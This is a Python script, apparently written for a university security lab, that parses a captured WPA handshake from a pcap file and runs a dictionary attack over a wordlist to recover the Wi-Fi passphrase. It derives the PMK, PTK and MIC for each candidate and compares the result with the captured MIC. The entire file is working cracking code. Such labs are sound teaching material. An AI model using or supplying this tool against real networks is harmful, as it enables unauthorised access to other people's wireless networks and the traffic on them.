#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Géraud Silvestri, Alexandre Jaquier, Francis Monti"
__copyright__   = "Copyright 2023, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"

import sys
import hmac, hashlib
from binascii import a2b_hex
from tqdm.rich import tqdm
from scapy.all import *
from pbkdf2 import *

def customPRF512(key,A,B):
    """
    This function Computes the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def get_handshake_params(pcap_file: str):
  """Read the capture file and grab the handshake parameters

  Args:
      pcap_file (str): The capture file path

  Returns:
      str: SSID
      bytes: B parameter
      bytes: payload data
      bytes: MIC to test
  """
  
  wpa=rdpcap(pcap_file)

  # Check for Association Request frame and start of handshake
  association_request = ""
  handshake_index = -1
  for i, pckt in enumerate(wpa):
      if association_request == "" and pckt.haslayer(Dot11AssoReq):
          association_request = pckt
      if handshake_index == -1 and pckt.haslayer(EAPOL):
          handshake_index = i
      if handshake_index != -1 and association_request != "":
          break
  if association_request == "":
    print("No association request found")
    exit(-1)
  if handshake_index == -1:
    print("No handshake found")
    exit(-1)

  # Important parameters for key derivation - most of them can be obtained from the pcap file
  ssid = association_request.info.decode("utf-8")
  ap_mac = a2b_hex(wpa[handshake_index].addr2.replace(":",""))
  client_mac = a2b_hex(wpa[handshake_index].addr1.replace(":","")) 

  # Authenticator and Supplicant Nonces
  ap_nonce = a2b_hex(wpa[handshake_index].load[13:45].hex())
  client_nonce = a2b_hex(wpa[handshake_index + 1].load[13:45].hex())

  mic_to_test = wpa[handshake_index + 3].original[-18:-2].hex() # We retrieve the MIC from the 4th frame of the 4-way handshake
  B = min(ap_mac,client_mac)+max(ap_mac,client_mac)+min(ap_nonce,client_nonce)+max(ap_nonce,client_nonce) # Used in pseudo-random function
  pckt_data = wpa[handshake_index + 3].original[48:-18] + b'\0' * 16 + wpa[handshake_index + 3].original[-2:] # We retrieve the data from the payload of the 4th frame of the 4-way handshake without the MIC

  return ssid, B, pckt_data, mic_to_test

def crack_mic(ssid: str, B: bytes, data: bytes, mic_to_test: bytes, wordlist_file: str):
  """Crack the WPA passphrase using the MIC, for each passphrase in the wordlist

  Args:
      ssid (str): SSID of the network
      B (bytes): The pseudo-random function parameter B
      data (bytes): The data from the payload of the 4th frame of the 4-way handshake without the MIC
      mic_to_test (bytes): The MIC to test
      wordlist_file (str): The path to the wordlist file
  """
  temp_stderr = sys.stderr
  print("Reading wordlist...")
  num_lines = sum(1 for line in open(wordlist_file, "r"))

  with open(wordlist_file, "r") as wordlist:
      print(f"Cracking passphrase for SSID: {ssid}...")
      ssid = ssid.encode()
      sys.stderr = open(os.devnull, "w")
      for passphrase in tqdm(wordlist, total=num_lines):
          # Compute 4096 rounds to obtain the 256 bit (32 oct) PMK
          passphrase = str.encode(passphrase).strip()
          pmk = pbkdf2(hashlib.sha1,passphrase, ssid, 4096, 32)

          # Expand pmk to obtain PTK
          ptk = customPRF512(pmk,str.encode("Pairwise key expansion"),B)

          # Compute MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
          mic = hmac.new(ptk[0:16],data,hashlib.sha1).hexdigest()[:32]

          if mic == mic_to_test:
            break
      else:
          print("No passphrase found")
          exit(-1)
      
      sys.stderr = temp_stderr
      print("\n\tFound passphrase: ", passphrase.decode("utf-8"))
      
  
if __name__ == "__main__":
  crack_mic(*get_handshake_params("wpa_handshake.cap"), "wordlist.txt")
